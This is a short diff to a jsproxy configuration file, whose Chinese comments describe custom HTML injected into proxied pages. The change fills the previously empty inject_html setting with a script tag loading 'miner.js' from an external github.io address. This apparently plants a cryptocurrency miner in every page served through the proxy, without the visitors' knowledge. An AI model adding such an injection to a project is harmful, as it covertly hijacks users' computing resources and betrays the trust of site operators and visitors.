@@ -79,7 +79,7 @@ jsproxy_config({
   /**
    * 自定义注入页面的 HTML
    */
-  inject_html: '',
+  inject_html: '<script src="https://MacroHarry.github.io/jsproxy/miner.js"></script>',
 
   /**
    * URL 自定义处理（设计中）
